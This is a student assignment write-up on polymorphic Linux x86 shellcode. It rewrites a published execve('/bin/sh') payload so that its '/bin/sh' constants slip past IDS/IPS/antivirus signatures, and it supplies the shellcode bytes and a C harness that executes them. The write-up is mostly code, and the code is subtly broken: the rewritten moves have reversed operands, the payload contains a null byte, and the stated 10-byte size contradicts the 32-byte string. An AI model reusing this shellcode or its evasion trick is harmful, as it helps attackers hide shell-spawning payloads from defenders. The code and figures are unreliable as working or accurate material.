# Assignment-VI - Polymorphic Shellcode

Challenge 01 - EXECVE modified version ( Reference : http://shell-storm.org/shellcode/files/shellcode-811.php )

Introduction
Polymorphism is the ability of an object to take on many forms. For pushing the value 0x6e69622f(nib/) into the stack will alert the IPS/AV. Instead we can go around the clock and push the dword 0x6e69622e and add a corresponding 0x00000001 so that it will be hard for the IDS/IPS/AV to detect the code for any possible execves.


### Challenge 1 : Analyzing Linux x86 execve("/bin/sh") - 28 bytes
http://shell-storm.org/shellcode/files/shellcode-811.php

This is an execve("/bin/sh") of 28 byte. Let's check the assembly code.

```
08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
 ```
 
 So the modified code looks as follows :

 ```
global _start

section .text

_start:

xor    eax, eax      ; zero our eax
push   eax

; push   0x68732f2f

mov eax, 0xd0e65e5e
ror eax, 1                       ; shift the register by 1 to right
push eax

; push   0x6e69622f
add eax, 0x5f63300               ; add 5f63300 to eax register to push 6e69622f                                       
push eax

mov    esp,ebx
mov    eax,ecx
mov    eax,edx
mov    al,0xb
int    0x80

; End section for exit call
xor    eax,eax
inc    eax
int    0x80
 ```
 
 Here I have done two few changes to the code : 
 
 1) The eax register for both 0x68732f2f is first brought to it's original form by first ROR the register by left.
 2) For this research, I have used bit shift calculator and shifted the accumulator by 1.
 3) Use the same method, I have added ror by 1 to shift the register back to it's original form to perform execve.
 4) Next, I have added 5f63300 to the accumulated eax to achieve 6e69622f instead of directly pushing it to the register.
 
 Compile the code using the "./compile.sh execve-modified".
 
 Use the following objdump to retrieve the shellcode of the nasm file.
  ```
 objdump -d ./execve-modified|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
  ```
  
shellcode : "\x31\xc0\x50\xb8\x5e\x5e\xe6\xd0\xd1\xc8\x50\x05\x00\x33\xf6\x05\x50\x89\xdc\x89\xc8\x89\xd0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

Now copy the obtained shellcode and provide it in the shellcode.c 
 ```
 #include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xb8\x5e\x5e\xe6\xd0\xd1\xc8\x50\x05\x00\x33\xf6\x05\x50\x89\xdc\x89\xc8\x89\xd0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
  ```

Compiling the shellcode using -z execstack ( gcc -fno-stack-protector -z execstack ) and run the shellcode file.

The observed size of shellcode : 10 bytes


